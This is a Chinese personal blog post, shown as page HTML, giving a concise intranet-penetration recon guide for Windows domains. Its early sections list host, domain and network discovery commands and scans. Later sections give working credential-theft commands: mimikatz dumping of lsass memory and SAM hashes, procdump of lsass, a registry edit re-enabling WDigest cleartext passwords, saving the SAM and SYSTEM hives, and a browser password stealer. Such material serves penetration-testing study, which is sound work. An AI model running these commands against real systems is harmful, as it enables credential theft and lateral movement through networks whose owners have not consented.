@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>内网渗透-信息收集(精简详细篇) | Traveler</title>
+  <meta name="description" content="一、前言上一篇我们已经讲了在Windows 主机里面信息探测的一些命令，但是有很多很杂，这里就把最常用的列在这里就行。 二、本机基础信息收集12345678910111213141.查看当前用户、权限。whoami  &#x2F;all2.查看网络配置&#96;ipconfig &#x2F;all&#96;3.查看主机路由信息route print4.查看操作系统信息systeminfo5.查看端口连接信息：netstat -ano">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透-信息收集(精简详细篇)">
+<meta property="og:url" content="https://ruan0423.github.io/2023/10/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%B2%BE%E7%AE%80%E8%AF%A6%E7%BB%86%E7%AF%87/index.html">
+<meta property="og:site_name" content="Ruan❥(^_-) Blog">
+<meta property="og:description" content="一、前言上一篇我们已经讲了在Windows 主机里面信息探测的一些命令，但是有很多很杂，这里就把最常用的列在这里就行。 二、本机基础信息收集12345678910111213141.查看当前用户、权限。whoami  &#x2F;all2.查看网络配置&#96;ipconfig &#x2F;all&#96;3.查看主机路由信息route print4.查看操作系统信息systeminfo5.查看端口连接信息：netstat -ano">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-10-30T04:29:45.000Z">
+<meta property="article:modified_time" content="2023-11-01T11:01:39.026Z">
+<meta property="article:author" content="Traveler">
+<meta property="article:tag" content="信息收集">
+<meta name="twitter:card" content="summary">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://ruan0423.github.io/2023/10/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%B2%BE%E7%AE%80%E8%AF%A6%E7%BB%86%E7%AF%87/index.html">
+  
+    <link rel="alternate" href="/" title="Ruan❥(^_-) Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Traveler</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">(((((((((((っ•ω•)っ Σ(σ｀•ω•´)σ 起飞！</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav menu-highlight">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/Ruan0423" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AF%B4%E6%98%8E/">说明</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%90%86/" rel="tag">代理</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81-python-%E5%BC%80%E5%8F%91-%E8%84%9A%E6%9C%AC/" rel="tag">代码 python 开发 脚本</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AF%B4%E6%98%8E/" rel="tag">说明</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/%E4%BB%A3%E7%90%86/" style="font-size: 13px;">代理</a> <a href="/tags/%E4%BB%A3%E7%A0%81-python-%E5%BC%80%E5%8F%91-%E8%84%9A%E6%9C%AC/" style="font-size: 13px;">代码 python 开发 脚本</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 13px;">信息收集</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 13px;">内网渗透</a> <a href="/tags/%E8%AF%B4%E6%98%8E/" style="font-size: 13px;">说明</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">十月 2023</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/11/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/" class="title">内网渗透-隧道搭建</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-11-02T10:49:44.000Z" itemprop="datePublished">2023-11-02</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/10/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%B2%BE%E7%AE%80%E8%AF%A6%E7%BB%86%E7%AF%87/" class="title">内网渗透-信息收集(精简详细篇)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-10-30T04:29:45.000Z" itemprop="datePublished">2023-10-30</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/python/">python</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/10/29/python%E4%B9%8Bre%E5%BA%93%EF%BC%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE/" class="title">python之re库，正则表达</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-10-29T09:02:41.000Z" itemprop="datePublished">2023-10-29</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E8%AF%B4%E6%98%8E/">说明</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/10/28/hexo%E4%BD%BF%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="title">hexo使用小技巧2</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-10-28T11:40:23.000Z" itemprop="datePublished">2023-10-28</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/10/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="title">内网渗透-信息收集（常见命令篇）</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-10-28T05:03:27.000Z" itemprop="datePublished">2023-10-28</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-内网渗透-信息收集-精简详细篇" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      内网渗透-信息收集(精简详细篇)
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2023/10/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%B2%BE%E7%AE%80%E8%AF%A6%E7%BB%86%E7%AF%87/" class="article-date">
+	  <time datetime="2023-10-30T04:29:45.000Z" itemprop="datePublished">2023-10-30</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/10/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%B2%BE%E7%AE%80%E8%AF%A6%E7%BB%86%E7%AF%87/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 2.1k(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 8(分)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>上一篇我们已经讲了在Windows 主机里面信息探测的一些命令，但是有很多很杂，这里就把最常用的列在这里就行。</p>
+<h1 id="二、本机基础信息收集"><a href="#二、本机基础信息收集" class="headerlink" title="二、本机基础信息收集"></a>二、本机基础信息收集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.查看当前用户、权限。whoami  /all</span><br><span class="line"></span><br><span class="line">2.查看网络配置`ipconfig /all`</span><br><span class="line"></span><br><span class="line">3.查看主机路由信息route print</span><br><span class="line"></span><br><span class="line">4.查看操作系统信息systeminfo</span><br><span class="line">5.查看端口连接信息：netstat -ano</span><br><span class="line">6.查看当前会话列表：net session</span><br><span class="line">7.查看网络共享信息：net share</span><br><span class="line">8.查看已连接的网络共享： net use</span><br><span class="line">9.查看当前进程信息：tasklist ,tasklist /svc (可通过这个进行杀软进程识别，)</span><br><span class="line">10.查看计划任务：schtasks /query /v /fo list</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>wmic</strong></p>
+<p>wmic 是微软为了方便管理规范的一个命令行工具，使用它可以获取更多进程和服务的详细信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.获取主机进程信息，并过滤进程的路径，名称和ID</span><br><span class="line">wmic process get name ,processid,executablepath</span><br><span class="line"></span><br><span class="line">2.获取具体某个进程的信息,就加个判断where语句就行</span><br><span class="line">wmic process where name=&quot;dwm.exe&quot; get executablepath</span><br><span class="line"></span><br><span class="line">3.查看服务信息,并过滤出服务的名称，路径，创建时间，运行状态。查看具体某项服务的具体信息和上述一样</span><br><span class="line">wmic service get caption,name,pathname,startname,state</span><br><span class="line"></span><br><span class="line">4.查看系统补丁安装信息，可通过这个来进行提劝收集。这可列出主机补丁列表，包括链接，名称，描述，编号，时间</span><br><span class="line">wmic qfe get caption ,csname ,description,hotfixid ,installedon</span><br><span class="line"></span><br><span class="line">5.查看主机上安装的软件信息，过滤出应用名称和版本</span><br><span class="line">wmic product get caption ,version</span><br><span class="line"></span><br><span class="line">6.查看自启程序信息</span><br><span class="line">wmic startup get caption ,command ,location , user</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="三、域内信息收集"><a href="#三、域内信息收集" class="headerlink" title="三、域内信息收集"></a>三、域内信息收集</h1><p>域内信息收集首先是判断是否存在域，这不说了，下面介绍常使用的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.net group /domain</span><br><span class="line">net group &quot;xx&quot; /domain</span><br><span class="line"></span><br><span class="line">net user /domain</span><br><span class="line">net user &#x27;xx&#x27; /domain</span><br><span class="line"></span><br><span class="line">2.上面的命令用于收集域内组和用户的信息，另外：</span><br><span class="line">wmic useraccount get caption , domain, description</span><br><span class="line">可以获得域内所有用户的sid,所属域，描述信息。当然这个命令只能是域用户才能使用。</span><br><span class="line"></span><br><span class="line">3.查看域内密码策略，有什么用？根据这些密码策略可以构造字典进行爆破</span><br><span class="line">net account /domain</span><br><span class="line"></span><br><span class="line">4.查看域控制器，获取域控制器的主机名</span><br><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line">nltest /DCLIST:traveler.com </span><br><span class="line"></span><br><span class="line">5.知道域域控制器之后，当然还要知道他的地址，使用ping ，可以ping主机名，可以ping域名，当然其实域控基本上就是作为域的DNS服务器，主机的DNS解析就是域的地址。</span><br><span class="line"></span><br><span class="line">6.然后我们还可以看看域的信任关系，为啥呢？一个用户只能访问自己本地域的信息，但是它想出轨去访问其他域的信息的话就需要建立域信任：</span><br><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure>
+
+<h1 id="四、内网资源探测"><a href="#四、内网资源探测" class="headerlink" title="四、内网资源探测"></a>四、内网资源探测</h1><p>既然主机的信息和域的信息探测差不多了，那么接下来就是探测一下资源啦，这里基本上是通过各种扫描技术来探测，主要为了后续的攻击，探测出主机的操作系统，端口啊，端口上的服务啊，当前的版本的漏洞啊啥的。</p>
+<h2 id="1-探测内网存活主机"><a href="#1-探测内网存活主机" class="headerlink" title="1.探测内网存活主机"></a>1.探测内网存活主机</h2><p>在进行探测之前肯定是先搭建内网代理的，这里就不讲，怎么搭建代理隧道见其他章节。</p>
+<p>主机探测主要是通过一些协议，通常是ICMP。NeTBIOS,UDP，ARP，SNMP.SMB .协议很多，所以探索出存活主机的方式有很多。</p>
+<h3 id="1-1基于ICMP探测"><a href="#1-1基于ICMP探测" class="headerlink" title="1.1基于ICMP探测"></a>1.1基于ICMP探测</h3><p>一看到ICMP是吧，就想到ping ，是的，可以使用for 循环ping c段的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) do @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2基于NetBIOS-网络基本输入、输出系统-探测"><a href="#1-2基于NetBIOS-网络基本输入、输出系统-探测" class="headerlink" title="1.2基于NetBIOS (网络基本输入、输出系统) 探测"></a>1.2基于NetBIOS (网络基本输入、输出系统) 探测</h3><p>上传nbtscan.exe到目标主机，地址<a target="_blank" rel="noopener" href="http://unixwiz.net/tools/nbtscan.html">http://unixwiz.net/tools/nbtscan.html</a></p>
+<p><code>执行nbtscan.exe 10.10.10.0/24</code></p>
+<h3 id="1-3-基于UDP探测"><a href="#1-3-基于UDP探测" class="headerlink" title="1.3 基于UDP探测"></a>1.3 基于UDP探测</h3><p>kali自带一个 unicornscan ,它使用udp协议探测存活主机</p>
+<p><code>unicornscan -mU 10.10.10.0/24</code></p>
+<h3 id="1-4-基于ARP协议"><a href="#1-4-基于ARP协议" class="headerlink" title="1.4 基于ARP协议"></a>1.4 基于ARP协议</h3><p>arp-scan 是一个快速扫描工具，很快，kali 自带，Windows需要上传</p>
+<p><code>arp-scan.exe -t 10.10.10.0/24</code> </p>
+<h2 id="2-探测端口"><a href="#2-探测端口" class="headerlink" title="2.探测端口"></a>2.探测端口</h2><h3 id="2-1-telnet-探测"><a href="#2-1-telnet-探测" class="headerlink" title="2.1 telnet 探测"></a>2.1 telnet 探测</h3><p>telnet ip port 可以检测该端口是否打开</p>
+<h3 id="2-2-nmap"><a href="#2-2-nmap" class="headerlink" title="2.2 nmap"></a>2.2 nmap</h3><p><code>nmap -sS -p- ip</code></p>
+<h3 id="2-3-获取banner信息"><a href="#2-3-获取banner信息" class="headerlink" title="2.3 获取banner信息"></a>2.3 获取banner信息</h3><p><code>banner信息中可能含有一些敏感信息</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -nv ip port</span><br><span class="line">telnet ip port</span><br><span class="line">nmap --script=banner -p port ip</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-用户凭据收集"><a href="#3-用户凭据收集" class="headerlink" title="3.用户凭据收集"></a>3.用户凭据收集</h2><p>在内网渗透中，被攻击的主机通常只是作为跳板进行横向渗透，然而横向的一些攻击方法通常需要吸纳获得域内用户的密码。</p>
+<p>mimikazt地址<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
+<p>百度网盘：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/166t4E-SfvHyDwuxlfq6wTw%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9A3azc">https://pan.baidu.com/s/166t4E-SfvHyDwuxlfq6wTw提取码：3azc</a></p>
+<h3 id="3-1-获取域内主机的密码和哈希值"><a href="#3-1-获取域内主机的密码和哈希值" class="headerlink" title="3.1 获取域内主机的密码和哈希值"></a>3.1 获取域内主机的密码和哈希值</h3><p>前言：</p>
+<p>Windows的密码是存在SAM文件中的，这个文件位于%Systemroot%&#x2F;system32&#x2F;config目录下，这个文件包含了用户的账号密码。在用户登录时会将用户输入的账号密码与这个文件进行匹配。</p>
+<p>那是怎么进行匹配的呢？那肯定还是要有进程是吧，这个进程就是lsass.exe ，当用户在登录界面输入账号密码后，这些东西就会存在进程的内存之中，那么好家伙，是不是我只要能读取这个内存那岂不是就OK了，但是这个操作时要权限滴，所以啊，提圈很重要，现在假设有权限了。</p>
+<p>有了这么个东西叫做<strong>Mimikatz</strong> ,Mimikatz 是一款功能强大的凭据转储开源程序，可以帮助测试人员提升进程权限，注入进程，读取进程内存。</p>
+<p>接下来要搞主机的密码我们就用这个工具去搞</p>
+<h4 id="1-读取lsass进程内存获取密码"><a href="#1-读取lsass进程内存获取密码" class="headerlink" title="1.读取lsass进程内存获取密码"></a><strong>1.读取lsass进程内存获取密码</strong></h4><p><strong>在线模式：</strong></p>
+<p>上传mimikatz到主机，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br><span class="line"></span><br><span class="line">#privilege::debug 用于提权至debugprivilege权限，这个权限就可以导出内容了</span><br><span class="line">#sekurlsa::logonpasswords 导出用户凭据</span><br></pre></td></tr></table></figure>
+
+<p><strong>离线模式：</strong></p>
+<p>离线模式就是，将进程的内容转储在一个文件上，然后再进行导出用户凭据，那么转储的工具有哪些呢？有OutMinidump.ps1、Procdump、sharpdump 。通常使用微软官方提供的prodump </p>
+<p>在目标机器上上传prodump 执行 <code>prodump.exe -accepteula -ma lsass.dmp</code></p>
+<p>这样就将lsass内存转储了，然后再执行：<br><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot;  &quot;sekurlsa::logonpasswords full&quot; exit</code></p>
+<p>#sekurlsa::minidump lsass.dump是加载内存文件</p>
+<p><strong>注意：</strong></p>
+<p>但是微软在2014年为了防止从内存中提取密码，禁用了WDigest 功能，使得Win sever2012及以上版本默认关闭Wdigest功能；但是可以通过修改注册表开启Wdigest功能，当下次登录或者注销登录的时候就可以重新获得密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#开启Wdigest</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br><span class="line">#关闭WDigest</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="2-读取SAM文件获取密码"><a href="#2-读取SAM文件获取密码" class="headerlink" title="2.读取SAM文件获取密码"></a>2.读取SAM文件获取密码</h4><p>也是直接使用mimikatz </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</span><br><span class="line"></span><br><span class="line">#privilege::dubug 提权至DebugPrivilege</span><br><span class="line"></span><br><span class="line">#token：：elevate 提权至system </span><br><span class="line"></span><br><span class="line">#lsadump:sam 读取本地sam文件</span><br></pre></td></tr></table></figure>
+
+<p><strong>离线：</strong></p>
+<p>为了防止SAM被脱裤直接被破解，window设置了秘钥，这个秘钥存在同目录下的SYSTEM文件中，所以要导出这两个文件（SAM和SYSTEM），但是呢这两个文件又是锁定的，又要借助工具才能导出，使用Invoke-NinjaCopy.ps1脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-NinjaCopy -path &quot;C:\windows\system32\config\SAM&quot; -LocalDestination C:\temp\SAM</span><br><span class="line">Invoke-NinCopy -path &quot;C:\windows\system32\config\SYSTEM&quot; -LocalDestination C:\temp\SYSTEM</span><br></pre></td></tr></table></figure>
+
+<p>当然除了工具之外也可以在管理员权限下通过注册表保存的方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SAM sam.hive </span><br><span class="line">reg save HKLM\SYSTEM system.hive</span><br></pre></td></tr></table></figure>
+
+<p>通过上述两个方式导出文件之后继续使用mimikatz来读取明文凭据信息</p>
+<p><code>mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit</code></p>
+<h1 id="五、主机软件中的凭据"><a href="#五、主机软件中的凭据" class="headerlink" title="五、主机软件中的凭据"></a>五、主机软件中的凭据</h1><p>有一些软件会自动把密码存储，这些密码哎嘿，你懂的。</p>
+<h2 id="1-获取PDR远程桌面的凭据"><a href="#1-获取PDR远程桌面的凭据" class="headerlink" title="1.获取PDR远程桌面的凭据"></a>1.获取PDR远程桌面的凭据</h2><p>也是使用mimikatz来解密。</p>
+<h2 id="2-可获取xshell等远程连接工具的密码"><a href="#2-可获取xshell等远程连接工具的密码" class="headerlink" title="2.可获取xshell等远程连接工具的密码"></a>2.可获取xshell等远程连接工具的密码</h2><h2 id="3-获取浏览器保存的登录密码"><a href="#3-获取浏览器保存的登录密码" class="headerlink" title="3.获取浏览器保存的登录密码"></a>3.获取浏览器保存的登录密码</h2><p>使用工具HackBrowserData。上传到主机，直接运行即可。</p>
+<p>地址：<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.4.4">https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.4.4</a></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
